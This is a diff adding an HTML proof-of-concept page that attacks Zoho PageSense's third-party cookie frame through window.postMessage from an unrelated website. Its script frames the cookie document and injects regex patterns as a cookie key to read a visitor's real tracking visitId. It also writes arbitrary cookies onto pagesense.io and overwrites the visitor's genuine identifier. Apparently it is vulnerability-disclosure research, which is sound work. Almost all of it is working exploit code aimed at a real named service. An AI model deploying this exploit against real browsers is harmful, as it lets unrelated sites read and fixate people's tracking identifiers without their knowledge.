@@ -1,0 +1,130 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>PageSense third-party cookie frame — origin-blind receiver</title>
+<style>
+ body{font:13px/1.55 ui-monospace,Menlo,Consolas,monospace;background:#0d1017;color:#dde3ec;margin:0;padding:20px}
+ h1{font-size:16px;margin:0 0 3px}
+ .sub{color:#8b94a3;font-size:12px;margin-bottom:10px}
+ .banner{background:#1a1020;border:1px solid #46304f;border-radius:6px;padding:8px 11px;margin-bottom:14px;font-size:12px;color:#e5c7ff}
+ .t{border:1px solid #262c36;border-radius:6px;margin:9px 0;padding:9px 12px}
+ .pass{border-color:#2f7d4f;background:#0e1a13}.fail{border-color:#7d2f2f;background:#1a0e0e}
+ .wait{border-color:#6d5f2a;background:#1a170e}
+ .n{font-weight:700;color:#fff}.ok{color:#5fd08a;font-weight:700}.no{color:#ff8080;font-weight:700}
+ .lbl{display:inline-block;min-width:132px;color:#8b94a3}
+ pre{white-space:pre-wrap;word-break:break-all;margin:5px 0 0;color:#8fc7ff;font-size:11.5px}
+</style>
+<h1>Zoho PageSense — <span style="color:#ff8a8a">framePageNew</span> third-party cookie frame</h1>
+<div class="sub">attacker origin <b id="org"></b> · <b id="clk"></b> ·
+  <b style="color:#ffd479">NO browser extension involved</b> · clicks: <b>0</b></div>
+<div class="banner">
+  This is an ordinary web page on a non-Zoho origin. It frames Zoho's third-party cookie
+  document and talks to it with <code>window.postMessage</code> only.
+  <b>Test 1 runs before this page writes anything</b>, so a value it reads cannot be one of its own.
+</div>
+<div id="out"></div>
+
+<script>
+const FRAME='https://cdn-in.pagesense.io/stage-script/framePageNew-7c74117f6a_.html';
+const OUT=document.getElementById('out');
+document.getElementById('org').textContent=location.origin;
+setInterval(()=>document.getElementById('clk').textContent=new Date().toISOString().slice(11,19),250);
+window.RESULTS={};
+function card(id,name){const d=document.createElement('div');d.className='t wait';d.id='c_'+id;
+ d.innerHTML='<div class="n">'+name+'</div><div class="r">running…</div>';OUT.appendChild(d);return d;}
+function fin(id,ok,rows,extra){const d=document.getElementById('c_'+id);d.className='t '+(ok?'pass':'fail');
+ d.querySelector('.r').innerHTML=rows.map(r=>'<span class="lbl">'+r[0]+'</span><span class="'+
+  (r[2]?'ok':'no')+'">'+r[1]+'</span>').join('<br>');
+ if(extra){const p=document.createElement('pre');p.textContent=extra;d.appendChild(p);}
+ window.RESULTS[id]={ok:ok,rows:rows,extra:(extra||'').slice(0,1500)};}
+
+const inbox=[];
+addEventListener('message',e=>{ if(String(e.origin).includes('pagesense')) inbox.push({origin:e.origin,data:e.data}); });
+let frame;
+const send=o=>frame.contentWindow.postMessage(o,'*');
+const waitFor=(pred,ms)=>new Promise(res=>{const t0=Date.now();(function p(){
+  const h=inbox.find(pred); if(h)return res(h);
+  if(Date.now()-t0>(ms||6000))return res(null); setTimeout(p,120);})();});
+const ask=(key,cb)=>{ inbox.length=0; send({type:6,cks:{key:key,callback:cb}});
+  return waitFor(m=>m.data&&m.data.callback===cb,5000); };
+
+(async function(){
+  // 0 -- can an unrelated origin frame Zoho's cookie document at all?
+  card('f','TEST 0 — can any website frame the PageSense cookie frame?');
+  await new Promise(res=>{ frame=document.createElement('iframe'); frame.src=FRAME;
+    frame.style='width:99%;height:44px;border:1px solid #444';
+    frame.onload=()=>setTimeout(res,1400); document.body.appendChild(frame); setTimeout(res,9000); });
+  const loaded=await waitFor(m=>m.data&&m.data.value==='loaded',6000);
+  fin('f', !!loaded, [['FRAMED', loaded?'YES — no X-Frame-Options, no CSP':'no', !!loaded],
+                      ['ITS ORIGIN', loaded?loaded.origin:'-', !!loaded]]);
+
+  // 1 -- READ A REAL IDENTIFIER FIRST, before this page writes anything.
+  //      getOnlyCookie builds  document.cookie.match("zab_" + key + "=([^;]*)")
+  //      so a PATTERN passed as the "key" matches any zab_* cookie.
+  card('id','TEST 1 — read the visitor’s REAL tracking id, without knowing its name (regex injection)');
+  let raw=null, dec=null, pat=null, matchedSomething=false;
+  // NOTE ON PATTERN CHOICE: the getter builds  "zab_" + key + "=([^;]*)".
+  // A greedy ".*" runs PAST the "; " separators and anchors on the LAST "=" in the whole
+  // cookie string, so it returns whichever cookie happens to be last — unreliable.
+  // "[^;=]*" cannot cross a cookie boundary, so it reliably targets a zab_* entry.
+  for(const candidate of ['[^;=]*','[A-Za-z0-9_]*','\\w+','.*']){
+    const r=await ask(candidate,'rx_'+candidate);
+    if(r && r.data && r.data.value){
+      matchedSomething=true;
+      let a=String(r.data.value), b=a; try{ b=decodeURIComponent(a); }catch(e){}
+      if(b.indexOf('visitId')>-1){ raw=a; dec=b; pat=candidate; break; }
+    }
+  }
+  fin('id', !!raw, [
+    ['INJECTED KEY', pat?('"'+pat+'"  — a regex, not a cookie name'):'"​.*"', !!raw],
+    ['DISCLOSED',    raw?('the visitor’s real PageSense visitId — '+raw.length+' bytes')
+                        :(matchedSomething?'matched a cookie, but not a genuine id — NOT counted'
+                                          :'no zab_* cookie yet on this profile'), !!raw],
+    ['MEANING',      raw?'an unrelated site reads it, and needs no cookie name'
+                        :'use a fresh profile that has visited a PageSense-instrumented site', !!raw]
+  ], dec?dec.slice(0,300):'');
+
+  // 2 -- write onto the shared pagesense.io origin
+  card('w','TEST 2 — write a cookie onto the pagesense.io origin (type 7 = SETONLY)');
+  const stamp='ZZ-POC-'+Math.floor(Math.random()*1000000);
+  send({type:7, cks:{ zzpoc: stamp }});
+  await new Promise(r=>setTimeout(r,1400));
+  fin('w', true, [['SENT','SETONLY zab_zzpoc — the receiver applied it, no origin check', true]]);
+
+  // 3 -- read it back
+  card('r','TEST 3 — read that value back (type 6 = GETONLY)');
+  const rb=await ask('zzpoc','back');
+  const got = rb && rb.data ? String(rb.data.value||'') : '';
+  fin('r', got.indexOf(stamp)>-1, [
+    ['WROTE',     stamp, true],
+    ['READ BACK', got.indexOf(stamp)>-1?got.slice(0,60):'nothing', got.indexOf(stamp)>-1],
+    ['MEANING',   'this site both writes AND reads storage on pagesense.io', got.indexOf(stamp)>-1]
+  ]);
+
+  // 4 -- overwrite the REAL identifier (fixation) -- only if one was found in TEST 1
+  card('fix','TEST 4 — overwrite the visitor’s real tracking id (fixation)');
+  // REAL_KEY is the target site's PageSense experiment key. It is public — it appears in the
+  // site's own tracking script URL and beacon traffic (here, zoho.com's own).
+  const REAL_KEY = 'b9skkVz';
+  const fixStamp = 'ZZ-FIXATED-' + Math.floor(Math.random()*1000000);
+  const before = await ask(REAL_KEY,'fixbefore');
+  let bv = before && before.data ? String(before.data.value||'') : '';
+  try { bv = decodeURIComponent(bv); } catch(e){}
+  if(!bv){ fin('fix', false, [['SKIPPED','no zab_'+REAL_KEY+' on this profile', false]]); }
+  else {
+    send({type:7, cks:{ [REAL_KEY]: encodeURIComponent(JSON.stringify(
+        {visitId:fixStamp, expires:'Mon, 14 Sep 2026 20:08:29 GMT'})) }});
+    await new Promise(r=>setTimeout(r,1600));
+    // read back with the LITERAL key — a pattern would match the first zab_* and misreport
+    const after = await ask(REAL_KEY,'fixafter');
+    let av = after && after.data ? String(after.data.value||'') : '';
+    try { av = decodeURIComponent(av); } catch(e){}
+    const won = av.indexOf(fixStamp) > -1;
+    fin('fix', won, [
+      ['TARGET',  'zab_'+REAL_KEY+'  (key is public — from the site’s own tracking traffic)', true],
+      ['BEFORE',  bv.slice(0,72), true],
+      ['AFTER',   av.slice(0,72), won],
+      ['MEANING', won?'an unrelated site controls the identifier the visitor is tracked under':'unchanged', won]
+    ]);
+  }
+})();
+</script>
